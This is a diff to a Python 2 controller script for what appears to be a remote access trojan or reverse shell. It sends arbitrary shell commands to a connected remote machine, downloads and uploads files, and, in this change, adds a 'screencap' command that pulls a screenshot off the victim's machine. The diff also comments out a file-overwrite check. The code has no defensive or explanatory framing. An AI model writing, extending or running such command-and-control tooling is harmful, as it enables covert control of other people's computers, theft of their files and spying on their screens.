@@ -84,11 +84,11 @@ def download_file(conn, args):
     if os.path.isdir(dst_file_path):
         print '[!] Directory:', dst_file_path, ' already exist, please specify another file name.'
         return
-
+    """
     if os.path.isfile(dst_file_path):
         print '[!] File:', dst_file_path, ' already exist, please specify another file name.'
         return
-
+    """
     conn.send('download ' + src_file_path)
 
     packet = conn.recv(RECV_BYTE)
@@ -153,6 +153,43 @@ def upload_file(conn, args):
 
     print '[*] Upload completed.'
 
+
+def screen_capture(conn, args):
+    arg_list = normalize_path_args(args)
+    arg_num = len(arg_list)
+    dst_file_path = './cap.jpg'
+    if arg_num > 1:
+        print '[!] Usage: screncap [<dst_file_path>]'
+        return
+    elif arg_num == 1:
+        dst_file_path = arg_list[0]
+
+    if os.path.isdir(dst_file_path):
+        dst_file_path += '/cap.jpg'
+
+    conn.send('screencap')
+
+    packet = conn.recv(RECV_BYTE)
+    if b64e('REMOTE_FILE_NOT_EXIST') in packet:
+        print '[!] Remote: screencap image does not exist.'
+    elif b64e('REMOTE_FILE_IS_A_DIRECTORY') in packet:
+        print '[!] Remote: screencap image is a directory.'
+    else:
+        transfer_done_token = b64e('REMOTE_FILE_DOWNLOAD_DONE')
+        f = open(dst_file_path, 'wb')
+        if not packet.endswith(transfer_done_token):
+            f.write(packet)
+            while True:
+                packet = conn.recv(RECV_BYTE)
+                if packet.endswith(transfer_done_token):
+                    break
+                f.write(packet)
+
+        # final data
+        f.write(packet.split(transfer_done_token, 1)[0])
+        f.close()
+
+
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind ((sys.argv[0], int(sys.argv[1])))
@@ -176,9 +213,11 @@ def connect():
             conn.close()
             break
         elif 'download' == action:
-            download_file (conn, args)
+            download_file(conn, args)
         elif 'upload' == action:
             upload_file(conn, args)
+        elif 'screencap' == action:
+            screen_capture(conn, args)
         else:
             conn.send(command)
             print conn.recv(RECV_BYTE)
